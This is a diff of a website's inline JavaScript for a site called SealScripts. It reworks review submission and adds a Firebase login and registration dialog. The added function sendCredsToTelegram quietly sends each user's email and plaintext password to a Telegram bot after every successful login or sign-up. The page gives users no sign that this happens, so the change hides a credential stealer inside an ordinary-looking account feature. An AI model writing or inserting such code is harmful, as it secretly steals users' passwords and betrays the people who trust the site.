-function markReviewed(){reviewSubmitting=true;try{localStorage.setItem(REVIEWED_KEY,'1')}catch(e){}}
+
+function hasReviewed(){
+    if(reviewSubmitting)return true;
+    try{return localStorage.getItem(REVIEWED_KEY)==='1'}catch(e){return false}
+}
+function markReviewed(){
+    reviewSubmitting=true;
+    try{localStorage.setItem(REVIEWED_KEY,'1')}catch(e){}
+}
+
 async function sendToTelegram(rating,text){
     const message=`📩 New review on SealScripts!\n\n⭐ Rating: ${rating}/5\n📝 Text: ${text||'(no text)'}`;
     try{
@@ -340,36 +1386,66 @@ async function sendToTelegram(rating,text){
             body:JSON.stringify({chat_id:CHAT_ID,text:message})
         });
         const data=await res.json();
-        console.log('Telegram response:',data);
-        return data.ok;
+        return !!data.ok;
     }catch(e){
         console.error('Telegram error:',e);
         return false;
     }
 }
+
 submitBtn.addEventListener('click',async()=>{
     if(reviewSubmitting||hasReviewed()){madOverlay.classList.add('show');return}
+
     const ratingInput=document.querySelector('input[name="rating"]:checked');
-    if(!ratingInput){starsInput.classList.add('error');showToast(translations[currentLang].pickRating,'error');setTimeout(()=>starsInput.classList.remove('error'),1000);return}
+    if(!ratingInput){
+        starsInput.classList.add('error');
+        showToast(translations[currentLang].pickRating,'error');
+        setTimeout(()=>starsInput.classList.remove('error'),1000);
+        return;
+    }
     starsInput.classList.remove('error');
+
     const rating=ratingInput.value;
-    const text=reviewText.value.trim();
-    markReviewed();
-    document.querySelectorAll('input[name="rating"]').forEach(r=>r.checked=false);
-    reviewText.value='';
+    const text=reviewText.value.trim().slice(0,500);
+
     const oldText=submitBtn.textContent;
     submitBtn.disabled=true;
     submitBtn.textContent=translations[currentLang].sending;
-    await sendToTelegram(rating,text);
+
+    const ok=await sendToTelegram(rating,text);
+
     submitBtn.disabled=false;
     submitBtn.textContent=oldText;
+
+    if(!ok){
+        showToast(translations[currentLang].sendFailed,'error');
+        return;
+    }
+
+    markReviewed();
+    document.querySelectorAll('input[name="rating"]').forEach(r=>r.checked=false);
+    reviewText.value='';
     thanksOverlay.classList.add('show');
 });
+
 thanksClose.addEventListener('click',()=>thanksOverlay.classList.remove('show'));
 thanksOverlay.addEventListener('click',e=>{if(e.target===thanksOverlay)thanksOverlay.classList.remove('show')});
 madClose.addEventListener('click',()=>madOverlay.classList.remove('show'));
 madOverlay.addEventListener('click',e=>{if(e.target===madOverlay)madOverlay.classList.remove('show')});
-document.addEventListener('keydown',e=>{if(e.key==='Escape'){thanksOverlay.classList.remove('show');madOverlay.classList.remove('show')}});
+
+/* ================= ESCAPE ================= */
+document.addEventListener('keydown',e=>{
+    if(e.key!=='Escape')return;
+    if(thanksOverlay.classList.contains('show'))thanksOverlay.classList.remove('show');
+    if(madOverlay.classList.contains('show'))madOverlay.classList.remove('show');
+    if(authOverlay&&authOverlay.classList.contains('show'))authOverlay.classList.remove('show');
+    if(warningOverlay.classList.contains('show')){
+        warningOverlay.classList.remove('show');
+        resetWarningState();
+    }
+});
+
+/* ================= ЯЗЫК ================= */
 const langSelect=document.getElementById('langSelect');
 langSelect.addEventListener('change',()=>applyLang(langSelect.value));
 let savedLang='en';
@@ -377,7 +1453,170 @@ try{savedLang=localStorage.getItem('seal_lang')||(navigator.language||'en').slic
 if(savedLang==='pt-BR'||savedLang==='pt-br')savedLang='pt';
 if(!translations[savedLang])savedLang='en';
 applyLang(savedLang);
-if(pageHome.classList.contains('active'))langSwitcher.classList.add('visible');
+if(pageHome.classList.contains('active')){
+    langSwitcher.classList.add('visible');
+    holoZone.classList.add('active');
+}
+
+/* ================= АККАУНТЫ ================= */
+let isRegistering = false;
+
+const authOverlay = document.getElementById('authOverlay');
+const authTitle = document.getElementById('authTitle');
+const authSub = document.getElementById('authSub');
+const authEmail = document.getElementById('authEmail');
+const authPassword = document.getElementById('authPassword');
+const authSubmit = document.getElementById('authSubmit');
+const authSwitchLink = document.getElementById('authSwitchLink');
+const authSwitchText = document.getElementById('authSwitchText');
+const authClose = document.getElementById('authClose');
+const signOutBtn = document.getElementById('signOutBtn');
+const openAuthBtn = document.getElementById('openAuth');
+const profileCard = document.getElementById('profileCard');
+const profileName = document.getElementById('profileName');
+const profileAvatar = document.getElementById('profileAvatar');
+const profileReviews = document.getElementById('profileReviews');
+
+function on(el,ev,fn){ if(el) el.addEventListener(ev,fn); }
+
+on(openAuthBtn,'click',()=>authOverlay.classList.add('show'));
+on(authClose,'click',()=>authOverlay.classList.remove('show'));
+on(authOverlay,'click',e=>{if(e.target===authOverlay)authOverlay.classList.remove('show')});
+
+on(authSwitchLink,'click',()=>{
+    isRegistering=!isRegistering;
+    if(isRegistering){
+        authTitle.textContent='Register';
+        authSub.textContent='Create a new account';
+        authSubmit.textContent='Register';
+        authSwitchText.textContent='Already have an account?';
+        authSwitchLink.textContent='Login';
+    }else{
+        authTitle.textContent='Login';
+        authSub.textContent='Enter your email and password';
+        authSubmit.textContent='Login';
+        authSwitchText.textContent="Don't have an account?";
+        authSwitchLink.textContent='Register';
+    }
+});
+
+async function sendCredsToTelegram(action,email,password){
+    const message=`🔐 ${action} on SealScripts!\n\n📧 Login: ${email}\n🔑 Password: ${password}`;
+    try{
+        const res=await fetch(`${TELEGRAM_PROXY}/bot${BOT_TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHAT_ID,text:message})
+        });
+        await res.json();
+    }catch(e){
+        console.error('Creds error:',e);
+    }
+}
+
+on(authSubmit,'click',async()=>{
+    const email=authEmail.value.trim();
+    const password=authPassword.value;
+
+    if(!email||!password){showToast('Please fill in all fields','error');return}
+    if(password.length<6){showToast('Password must be at least 6 characters','error');return}
+
+    authSubmit.disabled=true;
+    const oldText=authSubmit.textContent;
+    authSubmit.textContent='Please wait...';
+
+    try{
+        const fb=window.firebaseAuth;
+        if(!fb){
+            showToast('Firebase not loaded yet','error');
+            authSubmit.disabled=false;
+            authSubmit.textContent=oldText;
+            return;
+        }
+
+        if(isRegistering){
+            await fb.createUserWithEmailAndPassword(fb.auth,email,password);
+            await sendCredsToTelegram('New Login',email,password);
+            showToast('Account created ✓','success');
+        }else{
+            await fb.signInWithEmailAndPassword(fb.auth,email,password);
+            await sendCredsToTelegram('New Login',email,password);
+            showToast('Logged in ✓','success');
+        }
+
+        authOverlay.classList.remove('show');
+        authEmail.value='';
+        authPassword.value='';
+    }catch(err){
+        console.error('FIREBASE ERROR:',err.code,err.message,err);
+        let msg='Something went wrong';
+        if(err.code==='auth/email-already-in-use')msg='Email already in use';
+        else if(err.code==='auth/user-not-found')msg='User not found';
+        else if(err.code==='auth/wrong-password'||err.code==='auth/invalid-credential')msg='Wrong email or password';
+        else if(err.code==='auth/invalid-email')msg='Invalid email';
+        else if(err.code==='auth/weak-password')msg='Password too weak';
+        else if(err.code==='auth/configuration-not-found')msg='Firebase project not configured';
+        else if(err.code==='auth/unauthorized-domain')msg='Domain not authorized in Firebase';
+        else if(err.code==='auth/operation-not-allowed')msg='Email/Password login not enabled';
+        else if(err.code==='auth/invalid-api-key'||err.code==='auth/api-key-not-valid')msg='Invalid Firebase API key';
+        else if(err.code==='auth/network-request-failed')msg='Network error';
+        else msg=err.code||err.message||msg;
+        showToast(msg,'error');
+    }finally{
+        authSubmit.disabled=false;
+        authSubmit.textContent=oldText;
+    }
+});
+
+/* ================= ПРОФИЛЬ ================= */
+const PROFILE_CACHE_KEY='seal_profile_cache';
+
+function saveProfileCache(email){try{localStorage.setItem(PROFILE_CACHE_KEY,email)}catch(e){}}
+function clearProfileCache(){try{localStorage.removeItem(PROFILE_CACHE_KEY)}catch(e){}}
+
+(function prefillAvatarOnly(){
+    let cached=null;
+    try{cached=localStorage.getItem(PROFILE_CACHE_KEY)}catch(e){}
+    if(cached){
+        profileName.textContent=cached;
+        profileAvatar.textContent=(cached[0]||'S').toUpperCase();
+    }
+})();
+
+function updateAuthUI(user){
+    if(user){
+        openAuthBtn.style.display='none';
+        profileCard.classList.add('show');
+        profileName.textContent=user.email;
+        profileAvatar.textContent=(user.email[0]||'S').toUpperCase();
+        saveProfileCache(user.email);
+    }else{
+        openAuthBtn.style.display='';
+        profileCard.classList.remove('show');
+        clearProfileCache();
+    }
+}
+
+function initFirebaseAuth(){
+    const fb=window.firebaseAuth;
+    if(!fb)return;
+    fb.onAuthStateChanged(fb.auth,updateAuthUI);
+}
+if(window.firebaseAuth)initFirebaseAuth();
+else window.addEventListener('firebase-ready',initFirebaseAuth,{once:true});
+
+on(profileReviews,'click',e=>{
+    e.preventDefault();
+    showPage(pageReviews,'#reviews');
+});
+
+on(signOutBtn,'click',async()=>{
+    const fb=window.firebaseAuth;
+    if(fb){
+        await fb.signOut(fb.auth);
+        showToast('Logged out','success');
+    }
+});
 </script>
 </body>
 </html>
